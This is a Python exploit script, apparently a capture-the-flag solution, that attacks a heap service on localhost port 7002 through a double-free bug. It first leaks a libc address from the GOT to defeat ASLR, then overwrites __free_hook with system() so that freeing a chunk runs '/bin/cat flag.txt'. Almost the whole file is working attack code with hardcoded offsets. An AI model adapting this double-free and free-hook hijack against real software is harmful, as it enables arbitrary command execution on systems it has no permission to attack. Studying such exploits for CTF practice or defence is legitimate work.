import socket

#COMMANDS 
CREATE  = b'c'
ASSIGN  = b'a'
DELETE  = b'd'
SEARCH	= b's'
ONE		= 0x01.to_bytes(1, 'little')
TWO		= 0x02.to_bytes(1, 'little')
THREE	= 0x03.to_bytes(1, 'little')
FOUR 	= 0x04.to_bytes(1, 'little')
FIVE	= 0X05.to_bytes(1, 'little')
EIGHT	= b"08"
SEVENTEEN = b"17"

# there is a double free vulnerability: it is 
# possible to call free() twice on the same pointer.
# the aim of the attack is overwrite __free_hook in order to make
# it point to system() and then call free() with cmd string as argument

got_addr_minus_16 = 0x604f10 - 0x10
free_hook_address_minus_16 = 0x606320- 0x10
cmd = b"/bin/cat flag.txt"

# aslr is enabled, so, before performing the actual atack we need to discover the base  
# address of the libc. To do so we can exploit the double free() vulnerability
# to leak the first address of the got(that contains the address of setsockopt()).
# libc base address can be then computed by subtracting setsockopt offset to the address 
# leaked.
s = socket.create_connection(("localhost",7002))
s.send(CREATE + ONE + EIGHT)
s.send(DELETE + ONE)
s.send(DELETE + ONE)
s.send(CREATE + TWO + EIGHT)
s.send(ASSIGN + TWO + got_addr_minus_16.to_bytes(8, 'little', signed=False))
s.send(CREATE + THREE + EIGHT)
s.send(CREATE + FOUR + EIGHT)  # slot 4 will contain the address of the got
s.send(SEARCH + FOUR)
setsockopt_addr = s.recv(8)
s.close()
															  #setsockopt offset
libc_base_addres = int.from_bytes(setsockopt_addr, "little") - 0x1238a0 

print("LIBC is allocated at: " + str(hex(libc_base_addres)))
									# system() offset
system_address = libc_base_addres + 0x55410

s = socket.create_connection(("localhost", 7002))
s.send(CREATE + ONE + EIGHT)
s.send(DELETE + ONE)
s.send(DELETE + ONE)
s.send(CREATE + TWO + EIGHT)
s.send(ASSIGN + TWO + free_hook_address_minus_16.to_bytes(8, 'little', signed=False))
s.send(CREATE + THREE + EIGHT)
s.send(CREATE + FOUR + EIGHT) # slot 4 will contain the address of __free_hook()
s.send(ASSIGN + FOUR + system_address.to_bytes(8, 'little', signed=False)) #overwriting __free_hook
s.send(CREATE + FIVE + SEVENTEEN)
s.send(ASSIGN + FIVE + cmd)
s.send(DELETE + FIVE) #system will be called instead of free()
print(s.recv(256).decode('ascii'))
